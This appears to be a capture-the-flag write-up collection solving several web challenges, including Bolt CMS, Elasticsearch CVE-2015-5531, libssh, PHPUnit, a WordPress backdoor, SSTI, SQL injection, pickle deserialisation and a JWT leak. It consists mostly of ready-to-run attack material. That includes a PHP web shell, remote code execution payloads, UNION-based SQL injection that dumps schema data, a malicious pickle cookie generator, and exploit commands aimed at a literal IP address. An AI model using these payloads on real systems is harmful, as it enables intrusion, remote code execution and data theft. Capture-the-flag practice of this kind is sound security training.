# cve
web cve


### Bolt

Find Bolt CMS, log in to /bolt/login, upload a PHP web shell as .html, then rename it to .php from the file manager.

PHP shell:

<?php echo system($_GET['cmd']);?>

Commands:

http://TARGET/files/rce.php?cmd=id
http://TARGET/files/rce.php?cmd=cat%20/flag.txt

### Elastic

The server runs old Elasticsearch and is vulnerable to CVE-2015-5531.

Commands:

curl -s http://34.40.1.122:32344/
searchsploit -m 38383
awk 'f{if(/^```/){exit} print} /^#!/{f=1; print}' 38383.py > elastic_clean.py
sed -i 's/^port = 9200$/port = 32344/' elastic_clean.py
python2 elastic_clean.py 34.40.1.122 /etc/passwd | tee elastic.out
grep -o "CTF{[^}]*}" elastic.out

### libssh

Service fingerprint shows libssh 0.8.3, vulnerable to CVE-2018-10993.

Commands:

nmap -sV -sC -p PORT HOST -Pn
python3 libssh.py HOST -p PORT -c "cd ..;cat flag.txt"

### php-unit

Directory brute force reveals exposed PHPUnit files.

Commands:

dirsearch -u http://TARGET/
curl -s http://TARGET/composer.json
curl -s -X POST --data "<?php system('cat /flag.txt');?>" http://TARGET/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

### nodiff-backdoor

A leaked WordPress backup reveals a backdoor in the Twenty Twenty-Two theme.

Commands:

dirsearch -u http://TARGET/
wget http://TARGET/backup.zip
unzip backup.zip -d backup
cd backup
grep -R "shell_exec(" .
curl "http://TARGET/?welldone=knockknock&shazam=id"
curl "http://TARGET/?welldone=knockknock&shazam=cat%20flag.php"

### Shark

The input field is vulnerable to Python SSTI. These three payloads are the cleanest path:

${__import__('os').popen('ls /').read()}
${__import__('os').popen('find / -name "flag*" 2>/dev/null').read()}
${__import__('os').popen('cat /home/ctf/flag').read()}

### Schematics SQLi

Register, log in, and test the product search field.

Payloads:

a' AND '1'='2
a' AND '1'='1
zzz' UNION SELECT 1,2,3,4-- -
zzz' UNION SELECT 'A','B','C','D'-- -

Column 2 is visible, so dump metadata from information_schema.

Payloads:

zzz' UNION SELECT 1,group_concat(table_name SEPARATOR 0x0a),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
zzz' UNION SELECT 1,group_concat(column_name SEPARATOR 0x0a),3,4 FROM information_schema.columns WHERE table_schema=database() AND table_name LIKE 'CTF{%'-- -

The flag is reconstructed from the flag-shaped table name and its column names.

### sweet-and-sour

The data cookie is Base64-encoded Python pickle. The app unpickles it and reflects the result.

Commands:

curl -i -s http://TARGET/ | grep -i set-cookie

Generate a malicious pickle that returns command output, then send it as the cookie.

COOKIE=$(python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps(type('x',(),{'__reduce__':lambda s:(eval,(\"__import__('os').popen('cat flag').read()\",))})())).decode())")
curl -s -b "data=$COOKIE" http://TARGET/dashboard | grep -o 'CTF{[^}]*}'

### online

Open online.pcapng in Wireshark and filter HTTP requests.

Filter:

http.request

Follow the cleartext MD5/crypto-tool POST request and recover the submitted value.

Commands:

echo 'UlBGUHtxcTU0NXNvczEyc3E2MDhxbm44cDIwMXM1MHM5NXA4NTIwb3JwOXM3NDRuMzU3M28xcXAwb3A1M3ByMDE5NzI2fQ==' | base64 -d
echo 'RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

### authorization

Directory enumeration exposes the whole auth flow.

Commands:

dirsearch -u http://TARGET/
curl -s http://TARGET/client_secrets.json

Use the leaked admin:admin credentials to get a JWT, then access /secrets.

TOKEN=$(curl -s -X POST http://TARGET/auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
curl -s http://TARGET/secrets -H "Authorization: JWT $TOKEN"

Important detail: this Flask-JWT app expects Authorization: JWT <token>, not Bearer <token>.
